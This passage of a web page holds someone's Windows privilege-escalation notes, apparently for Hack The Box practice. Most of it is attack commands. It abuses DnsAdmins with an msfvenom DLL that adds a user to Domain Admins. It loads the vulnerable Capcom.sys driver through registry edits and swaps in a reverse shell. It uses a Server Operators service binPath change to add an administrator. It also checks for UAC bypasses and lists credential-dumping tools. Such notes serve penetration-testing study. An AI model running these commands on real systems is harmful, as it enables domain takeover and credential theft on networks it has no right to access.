+<pre><code class="language-powershell-session">C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+</code></pre>
+<p>DNS Admin
+- DNS management is performed over RPC
+- <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line
+- When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated
+- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
+- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</p>
+<p>setup
+- we can generate a malicious DLL to add a user to the domain admins group</p>
+<pre><code>msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+</code></pre>
+<p>run the dnscmd to set the path for the dll</p>
+<pre><code class="language-cmd">dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+</code></pre>
+<p>==Must specify full path of the dll==
+need to restart dns server/service for attack to execute
+check permision for dns restart</p>
+<pre><code class="language-cmd-session">sc.exe sdshow DNS
+</code></pre>
+<p>How to read results:  Per this <a href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">article</a>,</p>
+<p>Print Operators
+    <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a> is another highly privileged group, which grants its members the <code>SeLoadDriverPrivilege</code>, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command <code>whoami /priv</code>, and don't see the <code>SeLoadDriverPrivilege</code> from an unelevated context, we will need to bypass UAC.
+    The <a href="https://github.com/hfiref0x/UACME">UACMe</a> repo features a comprehensive list of UAC bypasses, which can be used from the command line.
+    It's well known that the driver <code>Capcom.sys</code> contains functionality to allow any user to execute shellcode with SYSTEM privileges.
+ We can use <a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">this</a> tool to load the driver. The PoC enables the privilege as well as loads the driver for us.</p>
+<p>Download it locally and edit it, pasting over the includes below.</p>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;sddl.h&gt;
+#include &lt;stdio.h&gt;
+#include "tchar.h"
+</code></pre>
+<p>Next, from a Visual Studio 2019 Developer Command Prompt, compile it using <strong>cl.exe</strong>.</p>
+<pre><code class="language-cmd">cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+</code></pre>
+<p>Next, download the <code>Capcom.sys</code> driver from <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>, and save it to <code>C:\temp</code>. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.</p>
+<pre><code class="language-cmd">reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+</code></pre>
+<pre><code class="language-cmd">reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+</code></pre>
+<p>Enable privilege using  <code>EnableSeLoadDriverPrivilege.exe</code> binary.
+Verify Capcom driver is listed</p>
+<pre><code class="language-powershell">.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+</code></pre>
+<p>To exploit the Capcom.sys, we can use the <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> tool after compiling with it Visual Studio.
+If we do not have GUI access to the target, we will have to modify the <code>ExploitCapcom.cpp</code> code before compiling. Here we can edit line 292 and replace <code>"C:\\Windows\\system32\\cmd.exe"</code> with, say, a reverse shell binary created with <code>msfvenom</code>, for example: <code>c:\ProgramData\revshell.exe</code>.</p>
+<p>Server Operators
+Membership of this group confers the powerful <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> privileges and the ability to control local services. --&gt; we can change the binary path of a local service that runs as SYSTEM</p>
+<pre><code class="language-cmd"> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+</code></pre>
+<p>Use <code>sc</code> or <code>PsService.exe</code> from sysinternals suite to confirm access over service</p>
+<h2 id="uac-bypass">UAC Bypass</h2>
+<p>Check if UAC is enabled</p>
+<pre><code class="language-cmd">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+</code></pre>
+<p>Check UAC Level</p>
+<pre><code class="language-cmd">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+</code></pre>
+<p>5 means always notify
+The <a href="https://github.com/hfiref0x/UACME">UACME</a> project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.
+check os version</p>
+<pre><code class="language-powershell">[environment]::OSVersion.Version
+</code></pre>
+<p>find example for your build and follow directions</p>
+<h1 id="misc">Misc</h1>
+<p>If we have access to Mysql databse that can write files as system, we can use the wertrigger privilege esc steps: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger</p>
+<p>--------------------Tools/Scripts----------------------------------------</p>
+<p>PowerUp.ps1 
+    To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
+    Use:
+    . .\PowerUp.ps1
+    Invoke-Allchecks
+    Output:
+    will output various misconfigured services
+    ==Only llooks for a subset of misconfigs== run other tools too</p>
+<p>winPEAS
+    to get colors: REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+    red = good for hacker
+    green = good for defender
+    this should be a go to</p>
+<p>SHarpUp
+    C# compiled version of Powerup if powershell unavailable
+Seatbelt
+    will output info related to priv esc opportunities, but will not find them or point them out</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td>
+<td>C# project for performing a wide variety of local privilege escalation checks</td>
+</tr>
+<tr>
+<td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td>
+<td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">here</a></td>
+</tr>
+<tr>
+<td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></td>
+<td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td>
+</tr>
+<tr>
+<td><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></td>
+<td>C# version of PowerUp</td>
+</tr>
+<tr>
+<td><a href="https://github.com/411Hall/JAWS">JAWS</a></td>
+<td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td>
+<td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td>
+</tr>
+<tr>
+<td><a href="https://github.com/rasta-mouse/Watson">Watson</a></td>
+<td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td>
+<td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td>
+</tr>
+<tr>
+<td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td>
+<td>WES-NG is a tool based on the output of Windows' <code>systeminfo</code> utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></td>
+<td>We will use several tools from Sysinternals in our enumeration including <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>, and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td>
+</tr>
+</tbody>
+</table></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
